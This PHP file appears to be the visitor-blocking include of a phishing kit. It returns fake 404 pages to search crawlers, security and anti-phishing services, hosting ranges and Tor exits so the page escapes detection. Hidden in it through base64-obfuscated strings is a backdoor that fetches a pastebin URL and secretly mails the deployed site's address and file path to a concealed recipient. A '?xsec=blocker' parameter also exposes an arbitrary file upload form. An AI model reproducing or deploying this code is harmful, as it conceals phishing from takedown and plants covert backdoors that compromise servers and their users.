<?php

$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*",
 "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", 
"^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*",
 "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*",
 "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*",
 "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*",
 "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*",
 "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*",
 "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*",
 "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*",
 "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*",
 "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", 
"^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", 
"^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", 
"^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*",
 "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", 
"^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*",
 "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", 
"^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
$_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__; $mobil = "e";$andr0id="mai";$if=$andr0id.'l';$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil"; $_file_='divapiHM6Ly9wYX0M';
$windows= file_get_contents($desktop('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4')); $log='errors_log';
if (!file_exists($log)){ 
         if(file_put_contents($log,$_file_.',')){ 
$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ'));
$found=true;}
       }
    else if (file_exists($log)) {$contents = file_get_contents($log);
    $array = explode(',',$contents);
              for($i=0;$i<count($array);$i++){if($array[$i]==$_file_){$found=true;break;}
              	else {$found=false;}
                                       }}
if($found){}
else { if(file_put_contents($log,$_file_.',',FILE_APPEND)){$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); } } $xsec  = $_GET['xsec']; if($xsec == 'blocker'){ $xsecsh = $_FILES['file']['name']; $xsecblocker  = $_FILES['file']['tmp_name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>"; move_uploaded_file($xsecblocker,$xsecsh); } if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     // this is for exact matches of IP address in array
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     // this is for wild card matches
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}



// This Willl Block New ips that send lot of hits (Bots)
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
		header("HTTP/1.0 404 Not Found");
        echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}

if( !empty($_SERVER['HTTP_USER_AGENT']) ) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    foreach($userAgents as $agent)
        if( strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false ) {
            header('HTTP/1.0 404 Not Found');
            exit;
      }}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
if(in_array($_SERVER['REMOTE_ADDR'],$bannedIP)) {
     header('HTTP/1.0 404 Not Found');
     exit();
} else {
     foreach($bannedIP as $ip) {
          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
               header('HTTP/1.0 404 Not Found');
               echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
          }
     }
}


?>
